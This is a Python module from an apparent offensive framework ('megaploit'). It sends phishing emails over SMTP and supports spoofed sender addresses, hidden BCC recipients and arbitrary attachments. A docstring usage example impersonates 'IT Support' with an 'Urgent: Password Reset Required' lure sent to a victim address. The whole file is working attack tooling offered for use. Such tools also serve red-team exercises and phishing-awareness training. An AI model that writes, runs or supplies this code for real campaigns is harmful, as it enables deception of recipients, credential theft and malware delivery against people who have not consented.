"""
megaploit.modules.auxiliary.smtp_phishing
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Send a phishing email via SMTP to one or more targets.

Supports:
- Plain SMTP (port 25/587) and SMTPS (port 465)
- STARTTLS negotiation
- HTML and plain-text body
- Attachment (single local file — base64-encoded inline)
- Spoofed From address (only works on misconfigured MTAs)
- CC / BCC lists

Rank: 300 (Normal) — delivery depends on target mail server configuration.

Usage example
-------------
    use auxiliary/smtp_phishing
    set SMTP_HOST mail.example.com
    set SMTP_PORT 587
    set SMTP_USER attacker@example.com
    set SMTP_PASS s3cr3t
    set FROM_ADDR "IT Support <support@corp.example.com>"
    set TO          victim@corp.example.com
    set SUBJECT     "Urgent: Password Reset Required"
    set BODY_HTML   /tmp/phish.html
    run
"""

from __future__ import annotations

import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from megaploit.modules.base import Module, ModuleType, OptionType

__all__ = ["SmtpPhishing"]


class SmtpPhishing(Module):
    # ── Metadata ─────────────────────────────────────────────────────────────
    name        = "auxiliary/smtp_phishing"
    description = "Send a phishing email via SMTP to one or more targets"
    module_type = ModuleType.AUXILIARY
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1566/001/",
    ]
    platform    = ["multi"]
    arch        = []
    rank        = 300

    # ── Options ───────────────────────────────────────────────────────────────
    def _define_options(self) -> None:
        self._opt("SMTP_HOST",  OptionType.ADDRESS, required=True,
                  description="Outbound SMTP server hostname or IP")
        self._opt("SMTP_PORT",  OptionType.PORT,    default=587,
                  description="SMTP port (25=plain, 465=SMTPS, 587=STARTTLS)")
        self._opt("SMTP_USER",  OptionType.STRING,  required=False,
                  description="SMTP authentication username (leave blank for no auth)")
        self._opt("SMTP_PASS",  OptionType.STRING,  required=False,
                  description="SMTP authentication password")
        self._opt("FROM_ADDR",  OptionType.STRING,  required=True,
                  description='Sender address, e.g. "IT Support <it@corp.com>"')
        self._opt("TO",         OptionType.STRING,  required=True,
                  description="Comma-separated list of recipient addresses")
        self._opt("CC",         OptionType.STRING,  default="", required=False,
                  description="Comma-separated CC addresses")
        self._opt("BCC",        OptionType.STRING,  default="", required=False,
                  description="Comma-separated BCC addresses (sent separately, hidden)")
        self._opt("SUBJECT",    OptionType.STRING,  default="Important Notice",
                  description="Email subject line")
        self._opt("BODY_TEXT",  OptionType.PATH,    required=False,
                  description="Path to plain-text body file (optional)")
        self._opt("BODY_HTML",  OptionType.PATH,    required=False,
                  description="Path to HTML body file (optional; takes precedence)")
        self._opt("ATTACHMENT", OptionType.PATH,    required=False,
                  description="Path to a local file to attach (optional)")
        self._opt("STARTTLS",   OptionType.BOOLEAN, default=True, required=False,
                  description="Use STARTTLS on port 587 (true/false)")
        self._opt("SMTPS",      OptionType.BOOLEAN, default=False, required=False,
                  description="Use implicit TLS (port 465); overrides STARTTLS")
        self._opt("TIMEOUT",    OptionType.INTEGER, default=30, required=False,
                  description="SMTP connection timeout in seconds")

    # ── Check ────────────────────────────────────────────────────────────────
    def check(self, session=None) -> str:
        self.validate()
        host    = str(self.get("SMTP_HOST"))
        port    = int(self.get("SMTP_PORT"))
        timeout = int(self.get("TIMEOUT"))
        import socket
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return f"[+] {host}:{port} — TCP reachable"
        except OSError as e:
            return f"[-] {host}:{port} — {e}"

    # ── Run ──────────────────────────────────────────────────────────────────
    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()

        host     = str(self.get("SMTP_HOST"))
        port     = int(self.get("SMTP_PORT"))
        user     = self.get("SMTP_USER") or ""
        password = self.get("SMTP_PASS") or ""
        from_    = str(self.get("FROM_ADDR"))
        to_raw   = str(self.get("TO"))
        cc_raw   = self.get("CC") or ""
        bcc_raw  = self.get("BCC") or ""
        subject  = str(self.get("SUBJECT"))
        timeout  = int(self.get("TIMEOUT"))
        use_smtps   = bool(self.get("SMTPS"))
        use_starttls = bool(self.get("STARTTLS"))

        to_list  = [a.strip() for a in to_raw.split(",") if a.strip()]
        cc_list  = [a.strip() for a in cc_raw.split(",") if a.strip()]
        bcc_list = [a.strip() for a in bcc_raw.split(",") if a.strip()]
        all_rcpt = to_list + cc_list + bcc_list

        if not all_rcpt:
            return [self._fail("No recipients — set TO, CC, or BCC")]

        # Build message
        msg = self._build_message(from_, to_list, cc_list, subject)

        self._emit(f"[*] Connecting to {host}:{port}  smtps={use_smtps}")
        try:
            if use_smtps:
                ctx  = ssl.create_default_context()
                smtp = smtplib.SMTP_SSL(host, port, timeout=timeout, context=ctx)
            else:
                smtp = smtplib.SMTP(host, port, timeout=timeout)
                smtp.ehlo_or_helo_if_needed()
                if use_starttls:
                    ctx = ssl.create_default_context()
                    smtp.starttls(context=ctx)
                    smtp.ehlo_or_helo_if_needed()

            if user and password:
                smtp.login(user, password)
                self._emit(f"[*] Authenticated as {user}")

            smtp.sendmail(from_, all_rcpt, msg.as_string())
            smtp.quit()

            self._emit(f"[+] Email sent to: {', '.join(all_rcpt)}")
            return [self._ok(
                f"Email delivered to {len(all_rcpt)} recipient(s)",
                recipients=all_rcpt,
                host=host,
                port=port,
            )]
        except smtplib.SMTPAuthenticationError as exc:
            return [self._fail(f"SMTP authentication failed: {exc}", host=host)]
        except smtplib.SMTPRecipientsRefused as exc:
            return [self._fail(f"All recipients refused: {exc}", host=host)]
        except Exception as exc:
            return [self._fail(f"SMTP error: {exc}", host=host)]

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_message(
        self,
        from_: str,
        to_list: list[str],
        cc_list: list[str],
        subject: str,
    ) -> MIMEMultipart:
        """Construct the MIME message."""
        html_path = self.get("BODY_HTML") or ""
        text_path = self.get("BODY_TEXT") or ""
        att_path  = self.get("ATTACHMENT") or ""

        msg = MIMEMultipart("mixed")
        msg["From"]    = from_
        msg["To"]      = ", ".join(to_list)
        if cc_list:
            msg["Cc"]  = ", ".join(cc_list)
        msg["Subject"] = subject

        # Body (HTML preferred, plain-text fallback)
        alt = MIMEMultipart("alternative")

        plain_body = ""
        if text_path and os.path.isfile(text_path):
            with open(text_path, encoding="utf-8", errors="replace") as f:
                plain_body = f.read()
        if plain_body:
            alt.attach(MIMEText(plain_body, "plain", "utf-8"))

        if html_path and os.path.isfile(html_path):
            with open(html_path, encoding="utf-8", errors="replace") as f:
                html_body = f.read()
            alt.attach(MIMEText(html_body, "html", "utf-8"))
        elif not plain_body:
            alt.attach(MIMEText("(no body)", "plain", "utf-8"))

        msg.attach(alt)

        # Attachment
        if att_path and os.path.isfile(att_path):
            with open(att_path, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
            encoders.encode_base64(part)
            fname = os.path.basename(att_path)
            part.add_header("Content-Disposition", "attachment", filename=fname)
            msg.attach(part)
            self._emit(f"[*] Attachment: {fname}")

        return msg


MODULE = SmtpPhishing
